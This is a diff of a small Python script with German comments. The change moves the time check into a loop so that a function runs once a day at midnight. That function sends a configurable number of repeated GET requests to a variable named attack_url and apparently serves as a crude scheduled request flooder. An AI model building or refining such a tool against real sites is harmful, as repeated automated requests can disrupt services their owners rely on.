@@ -15,12 +15,13 @@ def start():
         t = int(source[1])
         for i in range(0,t,1):
             print(requests.get(attack_url).text)  
-#ruft die aktuelle zeit ab
-current_time = time.localtime()
-hours = current_time.tm_hour
-minutes = current_time.tm_min
-seconds = current_time.tm_sec
-#1x am tag wird start abgerufen
+
 while True:
+    #ruft die aktuelle zeit ab
+    current_time = time.localtime()
+    hours = current_time.tm_hour
+    minutes = current_time.tm_min
+    seconds = current_time.tm_sec
+    #1x am tag wird start abgerufen
     if hours == 0 and minutes == 0 and seconds == 0:
         start()
